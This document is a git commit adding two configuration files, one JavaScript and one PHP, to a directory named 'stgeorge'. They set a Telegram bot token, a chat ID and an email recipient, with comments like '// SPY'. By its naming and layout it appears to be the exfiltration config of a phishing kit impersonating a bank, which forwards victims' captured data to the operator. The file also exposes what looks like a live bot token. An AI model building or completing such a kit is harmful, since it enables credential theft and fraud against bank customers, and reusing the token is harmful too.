e0de3db2299fbf3ff5274bccfe7b5e9311ac2ec7
njosplin <njosplin@gmail.com>
2026-08-13 13:18:04 +1000

    Add files via upload

---
+++ stgeorge/config/email.js
@@ -0,0 +1,5 @@
+// config/email.js
+const CONFIG = {
+    apikey: "8759182003:AAFvSPlMMT_o5htgmxBtvr8KHEygUDgjWqM",  // your bot token
+    chatid: "722615124"                                          // your chat ID
+};
---
+++ stgeorge/config/email.php
@@ -0,0 +1,9 @@
+<?php
+ // SPY
+ $to = "email"; // put ur fucking mail here
+
+  
+ $tgbot= $api = $apikey ="8759182003:AAFvSPlMMT_o5htgmxBtvr8KHEygUDgjWqM"; // put ur telegram bot 
+
+ $chatid =$chatid1 ="722615124";
+?>
